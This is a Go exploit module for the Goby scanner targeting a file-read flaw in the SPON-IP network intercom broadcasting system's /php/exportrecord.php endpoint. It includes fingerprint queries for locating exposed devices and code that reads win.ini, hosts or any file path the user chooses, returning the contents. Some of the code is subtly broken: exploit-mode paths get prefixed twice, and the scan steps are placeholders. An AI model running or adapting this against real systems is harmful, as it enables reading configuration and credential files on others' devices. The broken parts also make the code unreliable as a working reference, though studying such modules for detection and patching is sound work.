package exploits

import (
	"errors"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "SPON-IP Network Intercom Broadcasting System /php/exportrecord.php File Read Vulnerability",
    "Description": "<p>The SPON-IP network intercom broadcast system is an efficient audio transmission solution based on IP network, which is suitable for public places such as shopping malls, schools and hospitals. With high-definition audio quality, flexible configuration options, and ease of integration, it can be combined with other security systems for one-to-one or multicast capabilities. The system is easy to operate, supports remote management, and can meet various application scenarios such as emergency broadcasting and daily notifications, improving communication efficiency and security. </p><p> This vulnerability allows an attacker to read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.</p>",
    "Product": "SPON",
    "Homepage": "https://www.spon.com.cn/",
    "DisclosureDate": "2024-11-04",
    "PostTime": "2024-11-06",
    "Author": "2974057526@qq.com",
    "FofaQuery": "(body=\"href=\\\"./logo192.png\\\"\" && body=\"window.MarkerWithLabel=MarkerWithLabel\") || body=\"id=\\\"labellicallowcount\\\" class=\\\"control-label\\\"\"",
    "GobyQuery": "(body=\"href=\\\"./logo192.png\\\"\" && body=\"window.MarkerWithLabel=MarkerWithLabel\") || body=\"id=\\\"labellicallowcount\\\" class=\\\"control-label\\\"\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows an attacker to read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If it is not necessary, it is forbidden to access the system on the public network.</p>",
    "References": [
        "https://blog.csdn.net/qq_36618918/article/details/135505213"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize,win.ini,hosts",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "C:\\Windows\\win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "世邦通信SPON-IP网络对讲广播系统 /php/exportrecord.php 文件读取漏洞",
            "Product": "世邦通信",
            "Description": "<p>世邦通信SPON-IP网络对讲广播系统是一款基于IP网络的高效音频传输解决方案，适用于商场、学校和医院等公共场所。它具备高清音频质量、灵活的配置选项和易于集成的特性，可以与其他安防系统相结合，实现一对一或组播功能。系统操作简便，支持远程管理，能够满足紧急广播和日常通知等多种应用场景，提升了通讯效率和安全性。</p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "SPON-IP Network Intercom Broadcasting System /php/exportrecord.php File Read Vulnerability",
            "Product": "SPON",
            "Description": "<p>The SPON-IP network intercom broadcast system is an efficient audio transmission solution based on IP network, which is suitable for public places such as shopping malls, schools and hospitals. With high-definition audio quality, flexible configuration options, and ease of integration, it can be combined with other security systems for one-to-one or multicast capabilities. The system is easy to operate, supports remote management, and can meet various application scenarios such as emergency broadcasting and daily notifications, improving communication efficiency and security.&nbsp;</p><p>&nbsp;This vulnerability allows an attacker to read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If it is not necessary, it is forbidden to access the system on the public network.<br></p>",
            "Impact": "<p>This vulnerability allows an attacker to read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9971"
}`

	sendPayload_oqUE91 := func(hostInfo *httpclient.FixUrl, fileUrl string, header map[string]string) (string, error) {
		// 定义一个函数用于发送 GET 请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		// 生成请求 URL
		url := `/php/exportrecord.php?downtype=10&downname=` + fileUrl

		// 执行 GET 请求
		resp, err := setGetRequest(hostInfo, url, header)
		if err != nil {
			return "", err
		}
		if err != nil {
			return "", err // 如果读取失败，返回错误
		}
		if resp.StatusCode != 200 {
			return "", errors.New("not response 200")
		}
		respTxt := resp.Utf8Html
		return respTxt, nil // 返回字符串

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 设置 vulURL
			vulURL := `/php/exportrecord.php?downtype=10&downname=C:\Windows\win.ini`
			defaultModeMap := map[string]string{
				`C:\Windows\win.ini`: `for 16-bit app support`,
			}
			uploadFileFunc := sendPayload_oqUE91
			header := map[string]string{} // 定义 header

			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl, header)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					ss.VulURL = u.FixedHostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			defaultModeMap := map[string][2]string{
				"win.ini": {`/php/exportrecord.php?downtype=10&downname=C:\Windows\win.ini`, `; for 16-bit app support`},
				`hosts`:   {`/php/exportrecord.php?downtype=10&downname=C:\Windows\System32\drivers\etc\hosts`, "localhost"},
			}
			uploadFileFunc := sendPayload_oqUE91
			header := map[string]string{} // 定义 header

			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl, header)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		}))
}
